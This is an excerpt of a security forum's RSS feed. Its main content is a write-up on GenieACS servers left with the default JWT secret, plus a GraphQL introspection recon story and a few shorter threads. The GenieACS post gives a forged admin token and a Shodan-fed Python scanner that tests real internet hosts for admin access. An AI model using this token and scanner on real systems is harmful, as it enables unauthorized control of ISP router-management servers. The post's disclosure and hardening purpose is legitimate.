            <p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/1/a/1a674a4c785c35a7ad00a1601ee136fd011d93ff.jpeg" data-download-href="/uploads/short-url/3LzIaXeCEBziwLGeCRMVr0L1B9l.jpeg?dl=1" title="hackersbyrez0.com"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/1/a/1a674a4c785c35a7ad00a1601ee136fd011d93ff_2_690x386.jpeg" alt="hackersbyrez0.com" data-base62-sha1="3LzIaXeCEBziwLGeCRMVr0L1B9l" width="690" height="386" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/1/a/1a674a4c785c35a7ad00a1601ee136fd011d93ff_2_690x386.jpeg, https://0x00sec.s3.amazonaws.com/optimized/3X/1/a/1a674a4c785c35a7ad00a1601ee136fd011d93ff_2_1035x579.jpeg 1.5x, https://0x00sec.s3.amazonaws.com/optimized/3X/1/a/1a674a4c785c35a7ad00a1601ee136fd011d93ff_2_1380x772.jpeg 2x" data-dominant-color="712D45"></a></div><p></p>
<p>Long time no see!</p>
<p>I haven’t blogged anything for a while here on 0x00sec. And that’s a shame since this community made me what I am right now and taught me nearly everything related to hacking, all while I made (and am still making!) some good friends.</p>
<p>It’s been a while since I’ve started disclosing exposures to organizations that expose sensitive data on the Internet. It’s a fun process of mass scanning for exposures, misconfigurations, or just interesting hosts (thanks, Shodan), which can be further explored.</p>
<p>The whole purpose of discovering exposures and vulnerabilities is to get the thrill of finding out how exploitable the Internet actually is. Of course, this also gives me the responsibility to report the issue to the owner. This is <strong>not</strong> blackhat activity nor a documentation of known vulnerabilities out in the wild. It’s a series from which some will hopefully learn something about attacking (and defending) with the sole purpose of contributing to security while having some fun.</p>
<p>So, in the spirit of restarting the forums culture and bringing some (hopefully) good content on 0x00sec, myself and <a class="mention" href="https://0x00sec.org/u/messede">@messede</a> (a badass 0x00sec hacker who sparked in me the idea of the series) decided to create this little series called <strong>“Web Vulnerabilities and Disclosure Revelations”</strong>.</p>
<p>In this series of articles, we will blog about some of our findings and the ways we found them. After we first disclose to the organization/company, we will publish the articles depending on the organization’s actions. This means they either:</p>
<ul>
<li>Fix the issue and allow us to publish</li>
<li>Don’t fix the issue and 90 days have passed</li>
<li>Don’t reply to us and 90 days have passed</li>
<li>Say it’s not a risk but we think the opposite</li>
</ul>
<p>The writeups won’t be simple web vulnerability writeups. Unless we decide otherwise, it’ll be more high-profile bugs.</p>
<p>In the cases where the vulnerabilities are still out there, we will try to redact the owner/organization as much as possible (that is, if we decide to redact at all). The goal of the series is to educate on offensive security and the process of disclosing vulnerabilities and/or have something fun to read. And not to create a stepping stone for any malicious intent.</p>
<p>This is the “initial commit” of the series. No idea how often we are going to publish or for how long. It could be a weekly thing, could be twice a month, it may even run for just a couple of months ¯\_(ツ)_/¯</p>
            <p><small>5 posts - 5 participants</small></p>
            <p><a href="https://0x00sec.org/t/series-web-vulnerabilities-and-disclosure-revelations-wvdr/37560">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/series-web-vulnerabilities-and-disclosure-revelations-wvdr/37560</link>
          <pubDate>Wed, 25 Oct 2023 12:47:41 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-37560</guid>
          <source url="https://0x00sec.org/t/series-web-vulnerabilities-and-disclosure-revelations-wvdr/37560.rss">Series: Web Vulnerabilities and Disclosure Revelations (WVDR)</source>
        </item>
        <item>
          <title>0day RCE in open source browsergame</title>
          <dc:creator><![CDATA[c0wm1lk]]></dc:creator>
          <category>Web Hacking</category>
          <description><![CDATA[
            <p>Hi everyone! I ended up doing some cyber security research in TravianZ, which is an open source clone of an older game called Travian. I ended up finding all sorts of fun vulnerabilities and was able to find a 0day RCE.</p>
<p>The vulnerabilities are a bit more complex and I tried to explain them as well as I could. I would absolutely love feedback on my blog post to see where I can improve my writing skills! If anything is unclear please feel free to ask. I tried to make my blog post accessible to beginners, so if anything is unclear I will do my best to clarify! <img src="https://0x00sec.org/images/emoji/twitter/slight_smile.png?v=12" title=":slight_smile:" class="emoji" alt=":slight_smile:" loading="lazy" width="20" height="20"></p>
<p>I hope you enjoy the read and learn something! <img src="https://0x00sec.org/images/emoji/twitter/smiley.png?v=12" title=":smiley:" class="emoji" alt=":smiley:" loading="lazy" width="20" height="20"></p>
<aside class="onebox allowlistedgeneric" data-onebox-src="https://bramdoessecurity.com/travianz-hacked/?share=0x00sec.org">
  <header class="source">

      <a href="https://bramdoessecurity.com/travianz-hacked/?share=0x00sec.org" target="_blank" rel="noopener nofollow ugc" title="11:20AM - 01 July 2023">Bram Does Security – 1 Jul 23</a>
  </header>

  <article class="onebox-body">
    <div class="aspect-image" style="--aspect-ratio:428/165;"><img src="https://0x00sec.s3.amazonaws.com/original/3X/b/e/bec9556e97e4c1011148347f6b94b520d4b67700.jpeg" class="thumbnail" width="428" height="165"></div>

<h3><a href="https://bramdoessecurity.com/travianz-hacked/?share=0x00sec.org" target="_blank" rel="noopener nofollow ugc">TravianZ Hacked</a></h3>

  <p>We will explore how we can get Remote Code Execution (RCE) through cryptographic failures, XSS, etc. in an open source PHP project.</p>


  </article>

  <div class="onebox-metadata">
    
    
  </div>

  <div style="clear: both"></div>
</aside>

            <p><small>8 posts - 5 participants</small></p>
            <p><a href="https://0x00sec.org/t/0day-rce-in-open-source-browsergame/35895">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/0day-rce-in-open-source-browsergame/35895</link>
          <pubDate>Wed, 05 Jul 2023 11:34:25 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-35895</guid>
          <source url="https://0x00sec.org/t/0day-rce-in-open-source-browsergame/35895.rss">0day RCE in open source browsergame</source>
        </item>
        <item>
          <title>Webcrawlers copying my site</title>
          <dc:creator><![CDATA[disponat]]></dc:creator>
          <category>Web Hacking</category>
          <description><![CDATA[
            <p>I recently created a site that would serve as a personal blog. I noticed that if I google my site’s name, I get an exact copy of it, hosted by someone else.</p>
<p>I’m guessing this is the action of a bot that does this on a large scale for phishing purposes.</p>
<p>That leads to the question: since this bot is copying any files I host on my site and hosting them themselves, does that introduce any vulnerabilities on their end? How would I go about looking for such vulnerabilities?</p>
<p>What is a good way to defend against these sort of bots? Is setting up a honeypot and ip banning an effective strategy?</p>
            <p><small>10 posts - 6 participants</small></p>
            <p><a href="https://0x00sec.org/t/webcrawlers-copying-my-site/35803">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/webcrawlers-copying-my-site/35803</link>
          <pubDate>Fri, 30 Jun 2023 03:55:20 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-35803</guid>
          <source url="https://0x00sec.org/t/webcrawlers-copying-my-site/35803.rss">Webcrawlers copying my site</source>
        </item>
        <item>
          <title>GenieACS And The Tale Of Default JWT Secret</title>
          <dc:creator><![CDATA[messede]]></dc:creator>
          <category>Web Hacking</category>
          <description><![CDATA[
            <h2>
<a name="backdrop-1" class="anchor" href="https://0x00sec.org#backdrop-1"></a>BackDrop:</h2>
<p>So i was scouring shodan the other day and found this interesting piece of software called <a href="https://0x00sec.org">GenieACS</a>, now GenieACS is a “Auto Configuration Server” for <a href="https://0x00sec.org">TR-069</a> enabled routers and similar devices, what this ACS server does is that it enables the ISP to perform firmware upgrades or change the wifi password remotely(among other things).<br>
Routers are configured with a ACS server url and a user-pass combo to authenticate itself against the ACS, the router then periodically checks into the ACS using the TR-069 protocl (which is basically a XML API over HTTP) and then download and applies any configuration changes indicated by the ACS. ACS servers are fairly common among ISPs and other sufficient large network operators. GenieACS is also a opesource solution, so kudos to that.</p>
<h2>
<a name="the-problem-2" class="anchor" href="https://0x00sec.org#the-problem-2"></a>The Problem:</h2>
<p>Once i discovered GenieACS, i naturally started browsing its installation and configuration instructions to find its default credentials, instead i come across something very interesting…</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/b/9/b9e6a2567b769dffefdc786719b4b880d5707cb2.png" data-download-href="/uploads/short-url/qwysJeXoTyQYmAHJok0a49T9RMS.png?dl=1" title="jwt" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/b/9/b9e6a2567b769dffefdc786719b4b880d5707cb2_2_690x231.png" alt="jwt" data-base62-sha1="qwysJeXoTyQYmAHJok0a49T9RMS" width="690" height="231" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/b/9/b9e6a2567b769dffefdc786719b4b880d5707cb2_2_690x231.png, https://0x00sec.s3.amazonaws.com/optimized/3X/b/9/b9e6a2567b769dffefdc786719b4b880d5707cb2_2_1035x346.png 1.5x, https://0x00sec.s3.amazonaws.com/original/3X/b/9/b9e6a2567b769dffefdc786719b4b880d5707cb2.png 2x" data-dominant-color="181C1F"></a></div><p></p>
<p>now i started wondering how many might have actually bothered to change that, well how many installing GenieACS might actually know what <a href="https://0x00sec.org">jwt</a> is ? (not everyone is a programmer).<br>
If anyone is using “secret” as the secret (duh!), we should be able to create a jwt token, sign it and then use this token to log into  GenieACS.</p>
<p><em><strong>Lets find out how many made that mistake.</strong></em></p>
<p>Before go any further lets take a look at the jwt token format that GenieACS uses.<br>
The Token must contain the following data:<br>
<code>{   "username": "admin",   "authMethod": "local",   "iat": 1782574412 }</code></p>
<blockquote>
<p>I discovered the format by installing GenieACS locally, logging in and then extracting and analyzing the jwt token it stored in the browser</p>
</blockquote>
<p>The following is a signed token with expiry set to a few years in the future:</p>
<pre><code class="lang-auto">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiYXV0aE1ldGhvZCI6ImxvY2FsIiwiaWF0IjoxNzgyNTc0NDEyfQ.y2JaygP5n4WBYQ_dytgS0qet0b6KvtT31UJWqee4L6c
</code></pre>
<p>you can visualize it using <a href="https://0x00sec.org">jwt.io</a></p>
<p>All one needs to do, to gain access to a instance using “secret” as its secret, is to set a cookie named <em><strong>genieacs-ui-jwt</strong></em>, with its value being the jwt token we justed cooked up.</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/e/f/ef72fc64f88ade8d21f3cb26d06e916054e43a22.png" data-download-href="/uploads/short-url/yagteVz3ymRrM3uEikObKmvJyZc.png?dl=1" title="genie1" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/e/f/ef72fc64f88ade8d21f3cb26d06e916054e43a22_2_690x399.png" alt="genie1" data-base62-sha1="yagteVz3ymRrM3uEikObKmvJyZc" width="690" height="399" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/e/f/ef72fc64f88ade8d21f3cb26d06e916054e43a22_2_690x399.png, https://0x00sec.s3.amazonaws.com/optimized/3X/e/f/ef72fc64f88ade8d21f3cb26d06e916054e43a22_2_1035x598.png 1.5x, https://0x00sec.s3.amazonaws.com/optimized/3X/e/f/ef72fc64f88ade8d21f3cb26d06e916054e43a22_2_1380x798.png 2x" data-dominant-color="222426"></a></div><p></p>
<p>Once the cookie is set, on refreshing the page we should be presented with the dashboard.</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/c/c/cc816ff84b2940b4583da0b2db5f1b0a0c9ca149.png" data-download-href="/uploads/short-url/tb8IMsBAxsD8IXwUN7v8XjdStKN.png?dl=1" title="genie2" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/c/c/cc816ff84b2940b4583da0b2db5f1b0a0c9ca149_2_690x343.png" alt="genie2" data-base62-sha1="tb8IMsBAxsD8IXwUN7v8XjdStKN" width="690" height="343" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/c/c/cc816ff84b2940b4583da0b2db5f1b0a0c9ca149_2_690x343.png, https://0x00sec.s3.amazonaws.com/optimized/3X/c/c/cc816ff84b2940b4583da0b2db5f1b0a0c9ca149_2_1035x514.png 1.5x, https://0x00sec.s3.amazonaws.com/optimized/3X/c/c/cc816ff84b2940b4583da0b2db5f1b0a0c9ca149_2_1380x686.png 2x" data-dominant-color="1C1E1C"></a></div><p></p>
<h2>
<a name="finding-exposed-instances-3" class="anchor" href="https://0x00sec.org#finding-exposed-instances-3"></a>Finding Exposed Instances</h2>
<p>So lets use shodan to see how widespread this issue is, we’ll use the query <code>http.html:"GenieACS"</code><br>
</p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/9/9/990fb807ac78e87e9433700635a65c1882f5f7a2.png" data-download-href="/uploads/short-url/lQ2Ji1GgiC7GCo3JvpHKYG0X5nk.png?dl=1" title="shodan" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/9/9/990fb807ac78e87e9433700635a65c1882f5f7a2_2_690x348.png" alt="shodan" data-base62-sha1="lQ2Ji1GgiC7GCo3JvpHKYG0X5nk" width="690" height="348" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/9/9/990fb807ac78e87e9433700635a65c1882f5f7a2_2_690x348.png, https://0x00sec.s3.amazonaws.com/optimized/3X/9/9/990fb807ac78e87e9433700635a65c1882f5f7a2_2_1035x522.png 1.5x, https://0x00sec.s3.amazonaws.com/original/3X/9/9/990fb807ac78e87e9433700635a65c1882f5f7a2.png 2x" data-dominant-color="251F1F"></a></div><br>
looks like we have quite a few.<p></p>
<ul>
<li>
<p>Lets quickly grab those addresses using shodan cli<br>
<code>shodan search 'http.html:"genieacs"' --limit 1000 &gt; raw</code></p>
</li>
<li>
<p>Clean the data to obatin only ip addresses and ports<br>
<code>cat raw| cut -f1,2 &gt; ip.txt</code></p>
</li>
</ul>
<p>We will now build a python script to verify the misconfiguration.</p>
<h3>
<a name="scanning-for-the-misconfiguration-4" class="anchor" href="https://0x00sec.org#scanning-for-the-misconfiguration-4"></a>Scanning For The Misconfiguration</h3>
<p>We’ll use the following script to get our job done. (<em>it’ll need the ip.txt file we created earlier</em>)</p>
<p>The script basically does the following:</p>
<ul>
<li>Use the jwt token and visit a privileged api endpoint, if we get a 200 status code we know the<br>
server is misconfigured.</li>
<li>It also verifies whether the server uses TLS and adjusts the url accordingly.</li>
</ul>
<pre><code class="lang-auto">import requests
import urllib3
import threading

urllib3.disable_warnings()

cookies = {
    'genieacs-ui-jwt': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiYXV0aE1ldGhvZCI6ImxvY2FsIiwiaWF0IjoxNzgyNTc0NDEyfQ.y2JaygP5n4WBYQ_dytgS0qet0b6KvtT31UJWqee4L6c',
}

headers = {
    'Accept': 'application/json, text/*',
    'Accept-Language': 'en-US,en',
    'Connection': 'keep-alive'
}

def check_host(url):
    try:
        response = requests.get(url+'/api/presets/?filter=true', cookies=cookies,headers=headers, verify=False)
        if response.status_code==200:
            print("[+] ",url)
    except:
        pass

def const_url(ip,port):
    if(port!=443):
        try:
            res = requests.get("http://"+ip+":"+port,timeout=5)
        except:
            url = "http://"+ip+":"+port
            return url
            
        if(res.status_code==400):
            #its https , we sent http request to https port
            url = "https://"+ip+":"+port
            return url
        else:
            url = "http://"+ip+":"+port
            return url
    else:
        url = "https://"+ip+":"+port
        return url

def check_misconf(ip,port):
    check_host(const_url(ip,port))

with open('ip.txt') as infile:
    for line in infile:
        try:
            ip,port = str(line).split()
            thread  = threading.Thread(target=check_misconf,args=(ip,str(port)))
            thread.start()
        except:
            print("err")
            pass
</code></pre>
<p>We now run <code>python3 script.py &gt; found.txt</code>.</p>
<h2>
<a name="analysis-5" class="anchor" href="https://0x00sec.org#analysis-5"></a>Analysis</h2>
<p>We had about a thousand addresses which we obtained from shodan<br>
</p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/c/5/c592b6b79daf0c0394ad259a1e374075f169abee.png" data-download-href="/uploads/short-url/sbOos8aykoPJEqGBYw7FJK2Hfc2.png?dl=1" title="wc-ip" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/c/5/c592b6b79daf0c0394ad259a1e374075f169abee_2_517x90.png" alt="wc-ip" data-base62-sha1="sbOos8aykoPJEqGBYw7FJK2Hfc2" width="517" height="90" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/c/5/c592b6b79daf0c0394ad259a1e374075f169abee_2_517x90.png, https://0x00sec.s3.amazonaws.com/optimized/3X/c/5/c592b6b79daf0c0394ad259a1e374075f169abee_2_775x135.png 1.5x, https://0x00sec.s3.amazonaws.com/original/3X/c/5/c592b6b79daf0c0394ad259a1e374075f169abee.png 2x" data-dominant-color="252537"></a></div><p></p>
<p>Our Script found around 300 servers which used “secret” as the secret<br>
<img src="https://0x00sec.s3.amazonaws.com/original/3X/5/8/58278000891daf0d10b5a0b58f7dd613eb69eed6.png" alt="wc-found" data-base62-sha1="czQE2mFRNE0J7bTDxOrLDzhA5ca" width="434" height="105"></p>
<p>Now thats about 30% of the instances that we analyzed.</p>
<h2>
<a name="takeaways-6" class="anchor" href="https://0x00sec.org#takeaways-6"></a>Takeaways</h2>
<ol>
<li>
<p>People install sofware with their eyes closed, they love copy pasting random commands.<br>
In the case of GenieACS had their documentation said</p>
<p><em>Run this command to Setup genie :</em><br>
<code>genieacs-ui --ui-jwt-secret $(head -10 /dev/random|md5sum)</code></p>
<p><em>Instead of</em></p>
<p><code>genieacs-ui --ui-jwt-secret secret</code></p>
<p>The fate we saw above could be avaoided.</p>
</li>
<li>
<p>Write documentation carefully, account for the ingenuity of the stupid.</p>
</li>
<li>
<p>Change default secrets/credentials even if you dont know what you’re doing, ALWAYS!!!</p>
</li>
</ol>
<h2>
<a name="further-reading-7" class="anchor" href="https://0x00sec.org#further-reading-7"></a>Further Reading</h2>
<ol>
<li><a href="https://semgrep.dev/blog/2020/hardcoded-secrets-unverified-tokens-and-other-common-jwt-mistakes" class="inline-onebox" rel="noopener nofollow ugc">Hardcoded secrets, unverified tokens, and other common JWT mistakes</a></li>
</ol>
            <p><small>9 posts - 7 participants</small></p>
            <p><a href="https://0x00sec.org/t/genieacs-and-the-tale-of-default-jwt-secret/32738">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/genieacs-and-the-tale-of-default-jwt-secret/32738</link>
          <pubDate>Sun, 01 Jan 2023 12:24:49 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-32738</guid>
          <source url="https://0x00sec.org/t/genieacs-and-the-tale-of-default-jwt-secret/32738.rss">GenieACS And The Tale Of Default JWT Secret</source>
        </item>
        <item>
          <title>AWS auto scalling DDOS</title>
          <dc:creator><![CDATA[lethallicked]]></dc:creator>
          <category>Web Hacking</category>
          <description><![CDATA[
            <p>Even if AWS auto scalling is present can my web application still be vulnerable to DDOS by  Brute forcing on login page?</p>
<p>I got a 504 Gateway time out error. I suspect this may be due to application level DOS.</p>
            <p><small>5 posts - 5 participants</small></p>
            <p><a href="https://0x00sec.org/t/aws-auto-scalling-ddos/32675">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/aws-auto-scalling-ddos/32675</link>
          <pubDate>Wed, 28 Dec 2022 13:24:22 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-32675</guid>
          <source url="https://0x00sec.org/t/aws-auto-scalling-ddos/32675.rss">AWS auto scalling DDOS</source>
        </item>
        <item>
          <title>A GraphQL tale: What else is in there besides introspection?</title>
          <dc:creator><![CDATA[hatecomputers]]></dc:creator>
          <category>Web Hacking</category>
          <description><![CDATA[
            <p><strong>TL;DR:</strong> Finding and extracting GraphQL endpoints / queries / mutations / data types (partially) without relying on introspection or fuzzing, from publicly available javascript files.</p>
<p>Story time: A couple days ago I was hanging out on Reddit when I saw someone talking about this one event I wanted to attend. As it had just been confirmed, I quickly went to the website so I could check the venue, but unfortunately couldn’t find the location. I rapidly learnt that I had to first (surprise, surprise), setup an account and agree with all the terms and conditions in order to see the address.</p>
<p>The thing is, I hate going around the web setting up accounts in websites I rarely go back to and sadly, this was one of those situations. I went for the no-brainer first: Got myself a disposable email and tried setting a dummy account. Kid’s stuff. Problem was, it didn’t work. They had whitelisted the email providers so unless you had gmail, outlook, etc you just couldn’t do it. “What an absolute bummer”, I thought to myself.</p>
<p>Eventually, fed up with the whole thing, I decided to do what any reasonable person in my position would: Proxy the app through BurpSuite and see if they were somehow leaking the damn address.</p>
<h2>
<a name="investigatin-1" class="anchor" href="https://0x00sec.org#investigatin-1"></a>Investigatin’…</h2>
<p>I put my hoodie on lol and after dodging an inexplicable amount of requests crafted solely with the intention of extracting every piece of information available, with the excuse of <em>bETTer uNdErsTanDiNg uSeR bEhAviOur</em>, I noticed a few requests flying over my proxy history tab, all referring to this <code>/gql</code> endpoint. Immediately, I knew this was the place I should probably be focusing on.</p>
<p>The <strong>gql</strong> is short for GraphQL. I’ve read a few things about GraphQL here and there when it first came out, but I didn’t pay much attention. Now, as you can imagine, approaching it took some probing and experimentation, which is usually a good recipe for an interesting article. I don’t think anything you will see here is actually groundbreaking but there’s definitely some nuggets you can benefit from, especially when it comes to analysing javascript files.</p>
<p>Anyways, interested in finding out if I ever manage to get that address without setting up an account while learning some GraphQL shenanigans along the way? If so, grab yourself a piece of that 4 formaggi pizza sitting on your desk for the last three days and keep on reading, because you are in for a ride.</p>
<h2>
<a name="a-graphql-prime-not-really-2" class="anchor" href="https://0x00sec.org#a-graphql-prime-not-really-2"></a>A GraphQL prime (not really)</h2>
<p>Let me first, set the stage to make sure we are all in the same page: If you haven’t been around web development for the last couple of years or don’t necessarily care because well, you actually have healthy and balanced life, let me fill you in: GraphQL stands for <strong>Graph Query Language</strong> and it was initially created by some folks from that social media platform &amp; company <s>which almost had democracy dismantled</s> responsible for creating / maintaining technologies such as React. It serves as an alternative to REST architecture, which became popular around the time single page apps became a thing (maybe).</p>
<p>The general idea is that you can basically tweak queries and adapt them to your needs, removing the necessity of creating multiple endpoints just to fulfil corner cases that you might eventually require. This is probably a very grotesque simplification and I’m sure there’s a whole lot more to cover, but I won’t.</p>
<p>So yeah, right, these are just… words. What does that <strong>actually</strong> mean? Alright, let’s say you want to fetch data from an user endpoint, something like <code>GET /user/1000</code>. In a classic REST app, this can be directly translated into “get data from user where its ID equals to 1000”:</p>
<pre><code class="lang-auto">GET /user/1000
</code></pre>
<p>Response:</p>
<pre><code class="lang-http">HTTP/2 200 OK
Content-Type: application/json
X-Other-Headers: idunno
Content-Length: 100

{
    "user": {
        "id": 1000,
        "name": "Mevin Kitnick",
        "address": {
            "street": "Whatever street",
            "zipCode": 1234,
            "city": "Los Angeles"
            "additionalInfo": {
                ...
            }
        }
    }
}

</code></pre>
<p>The first thing to noticed when checking the server response is <s>it’s 2022 so why the f*ck are you using incremental IDs</s> when the endpoint <code>/user/&lt;id&gt;</code> is called, it gives back the whole user whose id is 1000. Easy, right? However, let’s say now we care only about the address piece from the same user, maybe for a different part of the website. What happens then? Well, we would have to either get the entire user again and then, manually extract the address or if the back-end kids were nice enough, we could ask them to have this new endpoint introduced:</p>
<pre><code class="lang-auto">GET /user/1000/address
</code></pre>
<p>Response:</p>
<pre><code class="lang-http">HTTP/2 200 OK
Content-Type: application/json
X-Other-Headers: idunno
Content-Length: 40

{
    "address": {
        "street": "Whatever street",
        "zipCode": 1234,
        "city": "Los Angeles"
        "additionalInfo": {
            ...
        }
    }
}

</code></pre>
<p>When tinkering with graphs and queries (?) however, we instead always send a <code>POST</code> request, which looks a little odd at first, but sort of makes sense considering GraphQL expects a little more information in order to provide what we need (see request’s body below):</p>
<p>in GraphQL’s fashion, this would be the equivalent <code>GET /user/1000</code> we previously saw:</p>
<pre><code class="lang-http">POST /graphql HTTP/2
Host: www.someapp.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:103.0) Gecko/20100101 Firefox/103.0
Accept: */*
Accept-Language: undefined
Accept-Encoding: gzip, deflate
Content-Type: application/json
Origin: https://www.someapp.com

{
    "query": { query { user(ID: $id) { username, lastUpdate }} },
    "variables": {
        id: 1000
    }
}

</code></pre>
<p>Same for address <code>GET /user/1000/address</code>:</p>
<pre><code class="lang-http">POST /graphql HTTP/2
Host: www.someapp.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:103.0) Gecko/20100101 Firefox/103.0
Accept: */*
Accept-Language: undefined
Accept-Encoding: gzip, deflate
Content-Type: application/json
Origin: https://www.someapp.com

{
    "query": { query { user(ID: $id) { address }} },
    "variables": {
        id: 1000
    }
}

</code></pre>
<p>Have you noticed the endpoint hasn’t really changed? This means that once the schema is defined, we can easily request different subsets of data and the GraphQL server will gladly provide us just that, while the endpoint remains the same. Hopefully that makes sense. If it doesn’t, I guess maybe… read the docs?</p>
<p>GraphQL has massive adoption amongst the cool kids these days - considering you are reading this is 2022, I don’t really know what the future holds -  so you won’t have any trouble finding <s>a shit load of redundant</s> content about it out there.</p>
<p>Now that this is out of the way, we move on…</p>
<h2>
<a name="graphql-recon-the-classic-medieval-style-3" class="anchor" href="https://0x00sec.org#graphql-recon-the-classic-medieval-style-3"></a>GraphQL Recon - The classic medieval style</h2>
<p>Every once in a while when I’m <s>dumbly typing things on Google and recklessly trying it out in the wild</s> performing a penetration test on a given application, whenever I come across a technology I’m not necessarily knowledgeable about - as in, most cases - my approach is the following: I start by poking with it directly as soon as I can. No joke, that’s it.</p>
<p>But if you allow me to elaborate: This is my attempt to get a sense of what it does without checking any other resources. In this case, it wasn’t different although I knew beforehand that as GraphQL is an open-source project, it would have been so much easier to just dive in, checking the documentation - which I eventually did. But I like to believe there’s some value in approaching things while clueless, as I’m still fresh and not bound by any usage expectations. Ultimately, this gives me full permission to be deliberately stupid and I might try things which they haven’t foreseen when designing the solution. Believe me when I say sometimes good things can come out of it (that’s what I like telling myself, at least). However in this case, nothing necessarily weird popped out. So ugh, a bit of a waste, but not entirely because up to this point, I was already familiar with the syntax and noticed some GraphQL errors were quite informative, which definitely gave me some leverage.</p>
<p>As my rEsEaRCh continued, I decided to take advantage of our collective brains and do some snooping. If there’s a lesson to be taken from this is, in a world of 7.9 billion people, THERE’S ALWAYS SOMEONE putting off the gym or bailing on their friends because they had convinced themselves there’s this incredible idea that needs to be shared with the world, right here right now, right? Right. It’s called functional procrastination, apparently. And as a matter of fact, this was no different.</p>
<p>So when I googled “how do I Hakc GraphQL!11”, a bunch of articles came up, where some slick folks who had already gone through the trouble, explained their methodology. One thing kept popping up however: They wouldn’t shut up about this thing called <em>introspection</em>, so I thought there was maybe something in there.</p>
<h3>
<a name="toying-with-introspection-for-fun-and-zero-profit-4" class="anchor" href="https://0x00sec.org#toying-with-introspection-for-fun-and-zero-profit-4"></a>Toying with introspection for fun and zero profit</h3>
<p><a href="https://graphql.org/learn/introspection/" rel="noopener nofollow ugc">Introspection</a> gives you the ability to extract metadata out of the schema provided, or to put it simply, get information about the schema itself. Think of it as the <a href="https://en.wikipedia.org/wiki/Information_schema" rel="noopener nofollow ugc">information_schema</a>’s younger sibling, who never got the chance to hangout with his older bro because his family, the rich type, don’t really want them to have anything to do with one another. But you don’t have to stretch too far to know they do. Got it?</p>
<p>Ok, equipped with this stupid analogy, I decided to give it a try:</p>
<pre><code class="lang-http">POST /graphql HTTP/2
Host: www.secreteventapp.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:103.0) Gecko/20100101 Firefox/103.0
Accept: */*
Accept-Language: en-us
Accept-Encoding: gzip, deflate
Content-Type: application/json
Origin: https://www.secreteventapp.com

{
    "query": { query __schema{types{name,fields{name}}} },
    "variables": {
    }
}
</code></pre>
<p>But it didn’t work. I know this because the response said <code>Error: Unable to use introspection</code>, so I guess we can all agree it didn’t. And I’ll be telling you why in just a second but first, let me tell what we could’ve done if things had been differently:</p>
<pre><code class="lang-http">POST /graphql HTTP/2
Host: www.secreteventapp.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:103.0) Gecko/20100101 Firefox/103.0
Accept: */*
Accept-Language: undefined
Accept-Encoding: gzip, deflate
Content-Type: application/json
Origin: https://www.secreteventapp.com

{
    "query": { query __schema{types{name,fields{name, args{name,description,type{name, kind, ofType{name, kind}}}}}} },
    "variables": {
    }
}
</code></pre>
<p>Hopefully I haven’t left you feeling alone and bamboozled with so many curly braces, but if that’s the case, here’s a quick walkthrough: When sending this query to the server, it immediately gives back all the graph’s node names along with their respective fields and last but not least, every field’s data type. Isn’t that cute? They just purposefully give us information, free of charge. I mean, it doesn’t give you the queries per see, but knowing the schema and the format expected, you can craft your own. Easy peasy.</p>
<p>Now, going back to the point where it didn’t work: Apparently, <a href="https://www.apollographql.com/blog/graphql/security/why-you-should-disable-graphql-introspection-in-production/" rel="noopener nofollow ugc">people realized it doesn’t make much of sense having introspection enabled for the most part</a>, so the standard recommendation is actually disabling it. A bummer, but a tiny win for our broken little industry.</p>
